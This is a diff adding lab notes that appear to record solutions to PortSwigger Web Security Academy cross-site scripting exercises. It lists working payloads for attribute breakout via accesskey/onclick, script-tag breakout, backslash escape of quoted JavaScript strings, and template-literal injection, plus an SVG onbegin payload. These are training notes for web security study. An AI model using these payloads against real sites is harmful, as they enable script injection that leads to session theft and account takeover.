@@ -95,6 +95,40 @@ location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?s
 // apparently, onbegin triggers when an animated svg begins playing.
 <svg><animatetransform onbegin=alert(1)>
 
+===
+
+// target URL:
+// apparently the app creates an element on the page
+// we break out and bind accesskey and onclick events to trigger xss:
+https://0a2500ef038c58f782cdec5e005d0038.web-security-academy.net/?'accesskey='x'onclick='alert(1)
+
+===
+
+// injection with quotes fails.
+// they are escaped.
+// break out of the entire script and start a new block:
+</script><script>alert(1)</script>
+
+===
+
+// test inject, fails. quotes escaped.
+// source reveals use of search string in javascript var.
+var searchTerms = 'test\'123';
+
+// escape using a leading backslash so their backslash is escaped by ours.
+\'-alert(1)//
+
+// resulting var expression becomes:
+var searchTerms = '\\'-alert(1)//';
+
+===
+
+// search string gets embeded in template string:
+var message = `0 search results for 'test123'`;
+
+// leverage template expression to inject xss
+${alert(1)}
+
 
 
 
